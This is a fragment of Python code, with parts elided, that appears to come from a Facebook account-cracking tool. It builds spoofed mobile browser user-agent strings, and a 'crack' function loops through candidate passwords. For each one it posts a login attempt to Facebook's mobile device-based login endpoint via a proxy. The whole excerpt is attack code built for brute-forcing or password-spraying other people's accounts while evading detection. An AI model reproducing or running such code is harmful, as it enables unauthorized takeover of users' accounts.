...
#	B = f' en-us; GM Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/'
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			bx = ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=date, headers=head,proxies=proxy)
